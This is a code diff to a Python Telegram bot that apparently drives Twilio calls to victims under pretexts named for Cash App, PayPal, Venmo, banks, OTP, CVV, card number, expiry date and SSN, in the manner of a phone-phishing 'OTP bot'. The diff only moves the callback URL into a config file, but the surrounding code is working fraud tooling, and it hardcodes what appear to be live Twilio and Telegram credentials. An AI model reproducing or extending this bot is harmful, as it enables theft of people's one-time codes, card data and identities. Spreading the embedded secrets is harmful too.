@@ -7,11 +7,14 @@ import json
 import requests
 while True:
   try:
+    with open('ngrok.json', 'r') as f:
+        data = json.load(f)
+    ngrok_url = data['ngrok_url']
     account_sid = 'ACfa3e0cef474b5cca23924c9d72190908'
     callid = None
     auth_token = '636f830ec546c457f132cee78873141f'
     from_number = '+15076186053'
-    status_callback_url = 'https://9676-100-0-165-141.ngrok.io/call/status'
+    status_callback_url = f'{ngrok_url}/call/status'
     telegram_bot_token = '6096442307:AAEoN0VodeJjvtmwOQzFKBqKQRMBG75wh-M'
     telegram_bot = telebot.TeleBot(telegram_bot_token)
     @telegram_bot.message_handler(commands=['cashapp'])
@@ -40,7 +43,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://9676-100-0-165-141.ngrok.io/voice/cashapp?name={name}&chanid={message.chat.id}'
+            url=f'{ngrok_url}/voice/cashapp?name={name}&chanid={message.chat.id}'
         )
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
@@ -74,7 +77,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://9676-100-0-165-141.ngrok.io/voice/paypal?name={name}&chanid={message.chat.id}')
+            url=f'{ngrok_url}/voice/paypal?name={name}&chanid={message.chat.id}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -123,7 +126,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://9676-100-0-165-141.ngrok.io/voice/venmo?name={name}&chanid={message.chat.id}')
+            url=f'{ngrok_url}/voice/venmo?name={name}&chanid={message.chat.id}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -156,7 +159,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://9676-100-0-165-141.ngrok.io/voice/otp?name={name}&chanid={message.chat.id}&bisname={company}&dgt={digt}')
+            url=f'{ngrok_url}/voice/otp?name={name}&chanid={message.chat.id}&bisname={company}&dgt={digt}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -188,7 +191,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://9676-100-0-165-141.ngrok.io/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
+            url=f'{ngrok_url}/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -220,7 +223,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://9676-100-0-165-141.ngrok.io/voice/cvv?name={name}&chanid={message.chat.id}&card={card}')
+            url=f'{ngrok_url}/voice/cvv?name={name}&chanid={message.chat.id}&card={card}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -252,7 +255,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://9676-100-0-165-141.ngrok.io/voice/date?name={name}&chanid={message.chat.id}&card={card}')
+            url=f'{ngrok_url}/voice/date?name={name}&chanid={message.chat.id}&card={card}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -284,7 +287,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://9676-100-0-165-141.ngrok.io/voice/card?name={name}&chanid={message.chat.id}&card={card}')
+            url=f'{ngrok_url}/voice/card?name={name}&chanid={message.chat.id}&card={card}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
@@ -317,7 +320,7 @@ while True:
             status_callback=status_callback_url+f"?chanid={message.chat.id}",
             from_=from_number,
             status_callback_event=['Completed'],
-            url=f'https://9676-100-0-165-141.ngrok.io/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
+            url=f'{ngrok_url}/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
         button_text = "Hangup"
         button_data = f'hangup {call.sid}'
         button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
